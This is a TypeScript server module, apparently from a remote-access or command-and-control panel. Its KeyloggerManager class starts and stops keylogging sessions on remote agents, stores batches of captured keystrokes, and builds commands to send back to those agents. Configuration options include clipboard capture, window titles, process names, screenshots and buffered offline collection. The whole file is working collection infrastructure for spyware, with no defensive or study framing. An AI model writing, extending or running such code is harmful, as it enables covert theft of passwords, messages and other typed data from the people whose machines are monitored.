import { randomUUID } from 'crypto';
import { db } from '$lib/server/db';
import { keyloggerSession, keyloggerBatch } from '$lib/server/db/schema';
import { eq, desc, and } from 'drizzle-orm';
import type {
	KeyloggerCommandPayload,
	KeyloggerEventEnvelope,
	KeyloggerKeystroke,
	KeyloggerMode,
	KeyloggerSessionResponse,
	KeyloggerSessionState,
	KeyloggerStartConfig,
	KeyloggerTelemetryState
} from '$lib/types/keylogger';
import { logger } from '../logger';

const MAX_BATCH_HISTORY = 25;

function normalizeMode(mode?: KeyloggerMode | null): KeyloggerMode {
	if (mode === 'offline') {
		return 'offline';
	}
	return 'standard';
}

function normalizeConfig(config: KeyloggerStartConfig | undefined | null): KeyloggerStartConfig {
	const mode = normalizeMode(config?.mode);
	const normalized: KeyloggerStartConfig = {
		mode,
		cadenceMs: config?.cadenceMs ?? 250,
		batchIntervalMs: config?.batchIntervalMs ?? (mode === 'offline' ? 15 * 60 * 1000 : undefined),
		bufferSize: config?.bufferSize ?? (mode === 'offline' ? 5000 : 300),
		includeWindowTitles: config?.includeWindowTitles ?? mode !== 'offline',
		includeClipboard: config?.includeClipboard ?? false,
		emitProcessNames: config?.emitProcessNames ?? false,
		includeScreenshots: config?.includeScreenshots ?? false,
		encryptAtRest: config?.encryptAtRest ?? true,
		redactSecrets: config?.redactSecrets ?? true
	} satisfies KeyloggerStartConfig;
	return normalized;
}

export class KeyloggerManager {
	async getState(agentId: string): Promise<KeyloggerSessionResponse> {
		try {
			const sessionRecord = db
				.select()
				.from(keyloggerSession)
				.where(eq(keyloggerSession.agentId, agentId))
				.orderBy(desc(keyloggerSession.updatedAt))
				.get();

			const batches = db
				.select()
				.from(keyloggerBatch)
				.where(eq(keyloggerBatch.agentId, agentId))
				.orderBy(desc(keyloggerBatch.capturedAt))
				.limit(MAX_BATCH_HISTORY)
				.all();

			const telemetry: KeyloggerTelemetryState = {
				batches: batches.map((b) => ({
					batchId: b.id,
					capturedAt:
						b.capturedAt instanceof Date
							? b.capturedAt.toISOString()
							: new Date(b.capturedAt).toISOString(),
					totalEvents: b.totalEvents,
					events: JSON.parse(b.events) as KeyloggerKeystroke[]
				})),
				totalEvents: sessionRecord?.totalEvents ?? 0,
				lastCapturedAt: sessionRecord?.lastCapturedAt
					? sessionRecord.lastCapturedAt instanceof Date
						? sessionRecord.lastCapturedAt.toISOString()
						: new Date(sessionRecord.lastCapturedAt).toISOString()
					: undefined
			};

			return {
				session: sessionRecord
					? {
							sessionId: sessionRecord.id,
							agentId: sessionRecord.agentId,
							mode: sessionRecord.mode as KeyloggerMode,
							startedAt:
								sessionRecord.startedAt instanceof Date
									? sessionRecord.startedAt.toISOString()
									: new Date(sessionRecord.startedAt).toISOString(),
							active: Boolean(sessionRecord.active),
							config: JSON.parse(sessionRecord.config) as KeyloggerStartConfig,
							totalEvents: sessionRecord.totalEvents,
							lastCapturedAt: sessionRecord.lastCapturedAt
								? sessionRecord.lastCapturedAt instanceof Date
									? sessionRecord.lastCapturedAt.toISOString()
									: new Date(sessionRecord.lastCapturedAt).toISOString()
								: undefined
						}
					: null,
				telemetry
			} satisfies KeyloggerSessionResponse;
		} catch (err) {
			logger.error('Failed to get keylogger state', { agentId }, err);
			return { session: null, telemetry: { batches: [], totalEvents: 0 } };
		}
	}

	async createSession(
		agentId: string,
		config: KeyloggerStartConfig,
		sessionId?: string
	): Promise<KeyloggerSessionState> {
		const normalized = normalizeConfig(config);
		const identifier = sessionId?.trim() || randomUUID();
		const now = new Date();

		try {
			// Deactivate any existing sessions for this agent
			db.update(keyloggerSession)
				.set({ active: 0, updatedAt: now })
				.where(and(eq(keyloggerSession.agentId, agentId), eq(keyloggerSession.active, 1)))
				.run();

			db.insert(keyloggerSession)
				.values({
					id: identifier,
					agentId,
					mode: normalized.mode,
					startedAt: now,
					active: 1,
					config: JSON.stringify(normalized),
					totalEvents: 0,
					createdAt: now,
					updatedAt: now
				})
				.run();

			return {
				sessionId: identifier,
				agentId,
				mode: normalized.mode,
				startedAt: now.toISOString(),
				active: true,
				config: normalized,
				totalEvents: 0,
				lastCapturedAt: undefined
			};
		} catch (err) {
			logger.error('Failed to create keylogger session', { agentId, identifier }, err);
			throw err;
		}
	}

	async updateConfig(
		agentId: string,
		config: KeyloggerStartConfig
	): Promise<KeyloggerSessionState | null> {
		const normalized = normalizeConfig(config);
		const now = new Date();

		try {
			const sessionRecord = db
				.select()
				.from(keyloggerSession)
				.where(and(eq(keyloggerSession.agentId, agentId), eq(keyloggerSession.active, 1)))
				.get();

			if (!sessionRecord) {
				return null;
			}

			db.update(keyloggerSession)
				.set({ config: JSON.stringify(normalized), updatedAt: now })
				.where(eq(keyloggerSession.id, sessionRecord.id))
				.run();

			return {
				sessionId: sessionRecord.id,
				agentId: sessionRecord.agentId,
				mode: sessionRecord.mode as KeyloggerMode,
				startedAt:
					sessionRecord.startedAt instanceof Date
						? sessionRecord.startedAt.toISOString()
						: new Date(sessionRecord.startedAt).toISOString(),
				active: true,
				config: normalized,
				totalEvents: sessionRecord.totalEvents,
				lastCapturedAt: sessionRecord.lastCapturedAt
					? sessionRecord.lastCapturedAt instanceof Date
						? sessionRecord.lastCapturedAt.toISOString()
						: new Date(sessionRecord.lastCapturedAt).toISOString()
					: undefined
			};
		} catch (err) {
			logger.error('Failed to update keylogger config', { agentId }, err);
			return null;
		}
	}

	async stopSession(agentId: string, sessionId?: string): Promise<KeyloggerSessionState | null> {
		const now = new Date();
		try {
			const where = sessionId
				? eq(keyloggerSession.id, sessionId)
				: and(eq(keyloggerSession.agentId, agentId), eq(keyloggerSession.active, 1));

			const sessionRecord = db.select().from(keyloggerSession).where(where).get();

			if (!sessionRecord) {
				return null;
			}

			db.update(keyloggerSession)
				.set({ active: 0, updatedAt: now })
				.where(eq(keyloggerSession.id, sessionRecord.id))
				.run();

			return {
				sessionId: sessionRecord.id,
				agentId: sessionRecord.agentId,
				mode: sessionRecord.mode as KeyloggerMode,
				startedAt:
					sessionRecord.startedAt instanceof Date
						? sessionRecord.startedAt.toISOString()
						: new Date(sessionRecord.startedAt).toISOString(),
				active: false,
				config: JSON.parse(sessionRecord.config) as KeyloggerStartConfig,
				totalEvents: sessionRecord.totalEvents,
				lastCapturedAt: sessionRecord.lastCapturedAt
					? sessionRecord.lastCapturedAt instanceof Date
						? sessionRecord.lastCapturedAt.toISOString()
						: new Date(sessionRecord.lastCapturedAt).toISOString()
					: undefined
			};
		} catch (err) {
			logger.error('Failed to stop keylogger session', { agentId, sessionId }, err);
			return null;
		}
	}

	async ingest(
		agentId: string,
		envelope: KeyloggerEventEnvelope
	): Promise<KeyloggerTelemetryState> {
		if (!envelope || !Array.isArray(envelope.events)) {
			throw new Error('Invalid keylogger payload');
		}

		const now = new Date();
		const capturedAt = new Date(envelope.capturedAt);

		try {
			db.transaction((tx) => {
				const sessionRecord = tx
					.select()
					.from(keyloggerSession)
					.where(eq(keyloggerSession.id, envelope.sessionId))
					.get();

				const totalEvents =
					envelope.totalEvents ?? (sessionRecord?.totalEvents ?? 0) + envelope.events.length;

				if (sessionRecord) {
					tx.update(keyloggerSession)
						.set({
							totalEvents,
							lastCapturedAt: capturedAt,
							updatedAt: now
						})
						.where(eq(keyloggerSession.id, sessionRecord.id))
						.run();
				}

				tx.insert(keyloggerBatch)
					.values({
						id: envelope.batchId || randomUUID(),
						sessionId: envelope.sessionId,
						agentId,
						capturedAt,
						events: JSON.stringify(envelope.events),
						totalEvents,
						createdAt: now
					})
					.run();
			});

			const state = await this.getState(agentId);
			return state.telemetry;
		} catch (err) {
			logger.error(
				'Failed to ingest keylogger events',
				{ agentId, sessionId: envelope.sessionId },
				err
			);
			throw err;
		}
	}

	buildCommand(
		action: KeyloggerCommandPayload['action'],
		session: KeyloggerSessionState
	): KeyloggerCommandPayload {
		return {
			action,
			sessionId: session.sessionId,
			mode: session.mode,
			config: session.config
		} satisfies KeyloggerCommandPayload;
	}
}

export const keyloggerManager = new KeyloggerManager();
